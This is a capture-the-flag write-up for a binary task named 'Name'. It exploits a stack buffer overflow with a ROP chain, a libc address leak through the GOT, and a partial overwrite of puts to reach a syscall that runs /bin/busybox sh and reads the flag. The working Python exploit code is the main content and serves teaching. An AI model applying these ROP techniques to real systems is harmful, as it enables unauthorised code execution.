# Name
## Solution
In function `enter _name` we see just buffer overflow.
```c
void __fastcall enter_name()
{
  char buf[16]; // [rsp+0h] [rbp-10h] BYREF

  memset(buf, 0, sizeof(buf));
  printf("Enter your name: ");
  fflush(_bss_start);
  read(0, buf, 256uLL);
  puts("Thank you!");
  fflush(_bss_start);
}
```
Stack of this function
```
-0000000000000010 buf             db 16 dup(?)
+0000000000000000  s              db 8 dup(?)
+0000000000000008  r              db 8 dup(?)
+0000000000000010
+0000000000000010 ; end of stack variables
```

We can read to `buffer` variable up to 256 bytes.
16 for variable, 8 for stack, so we have 232 bytes for rop chain.

We dont have nor `system` function, nor `syscall` instruction calls. So we need to leak libc.

First of all find useful rops with ropper.
```
0x00000000004011fd : pop rbp ; ret
0x000000000040124e : pop rdi ; ret
0x0000000000401252 : pop rdx ; ret
0x0000000000401250 : pop rsi ; ret
```

Save this addresses and useful links to our exploit
```python
task_base = 0x400000

pop_rbp = task_base + 0x11fd # : pop rbp ; ret
pop_rdi = task_base + 0x124e # : pop rdi ; ret
pop_rdx = task_base + 0x1252 # : pop rdx ; ret
pop_rsi = task_base + 0x1250 # : pop rsi ; ret

logo_data = task_base + 0x4080
hello_data = task_base + 0x5220

puts_plt = task_base + 0x10B0
fflush_plt = task_base + 0x1120
write_plt = task_base + 0x10c0
read_plt = task_base + 0x10E0
printf_plt = task_base + 0x10d0

puts_plt_got = task_base + 0x4018
srand_plt_got = task_base + 0x4038
time_plt_got = task_base + 0x4048
```

Write simple function to create rop foa any function call.

```python
def call_v1(rip, rdi, rsi, rdx):
    return (
        pack(pop_rdi, 64) +
        pack(rdi, 64) +
        pack(pop_rsi, 64) +
        pack(rsi, 64) +
        pack(pop_rdx, 64) +
        pack(rdx, 64) +
        pack(rip, 64)
    )
```

Try to leak libc addresses via plt got table
```python
def leak_libc_addresses():
  io.sendline(
      b'A'*16 +
      b'S'*8 +
      call_v1(write_plt, 1, puts_plt_got, 8)+
      call_v1(write_plt, 1, srand_plt_got, 8) +
      call_v1(write_plt, 1, time_plt_got, 8)
  )
  io.recvuntil(b'Thank you!\n')
  for _ in range(3):
      received = io.recv(8)
      libc_base = unpack(received, 64)
      print("LIBC_FUNC", hex(libc_base))
```

Thanks to the service [libc.blukat.me](https://libc.blukat.me/) we can find libc version running on the server.

And it's `musl-1.2.4-r2.so`.

We know that ASLR enabled on the server, so we need to leak address and in the same rop use it.

But we can find way more easier.

With ropper we find very useful call of `syscall` instruction.
That very close to `puts` function.

Puts function at `0x04d20f`
```
0x000000000004d2e4: syscall;
```

So we just need to change last byte of puts function and we will get syscall.

But to call `syscall` instruction we need to be able to manipulate `rax` register, in task rops we dont have `pop rax` instructions, neither we have in musl about puts ot other instructions.
But we can go another way, as we remember functions return value via `rax` instruction, so just read 59 bytes to make rax equal 59 and after that call syscall.

I didn't managed to call /bin/sh, because task was ran on alpine, and locally in docker i go folowwing error
```
: applet not found
```
So we just call `/bin/busybox sh`.
Full rop
```python
def exec_sh():
  syscall_rop = 0xe4

  shell = (
          b'A'*16 +     # fill variable
          b'S'*8 +      # fill stack pointer
          # overwite puts address to libc syscall
          call_v1(read_plt, 0, puts_plt_got, 1) +
          # write command to logo string
          call_v1(read_plt, 0, logo_data, 59) +
          # syscall execve("/bin/busybox", ["sh"], NULL)
          call_v1(puts_plt, logo_data + 16, logo_data, 0)
      )

  print("ROP LENGTH", len(shell))

  io.send(shell + b'A'*(256-len(shell))) # send rop
  # send 1 byte to first read
  io.send(pack(syscall_rop, 8))

  # first term is pointer to first argument, that points to "sh" string.
  # second term is end of arguments, i.e. NULL
  # third term is our binary to call.
  # fourth argument is first argument.
  cmd = pack(logo_data + 29, 64) + pack(0, 64) + b'/bin/busybox\x00' + b'sh\x00'
  # send and fill reminding with 0 bytes
  io.send(cmd + b"\x00"* (59-len(cmd)))
  # send command
  io.sendline(b'ls')
```

And voila we have shell, so just read `/flag.txt` file.

Task and its rops ypu can find in [task.zip](task.zip).
Musl libc and its rops you can find in [musl-1.2.4-r2.zip](musl-1.2.4-r2.zip).
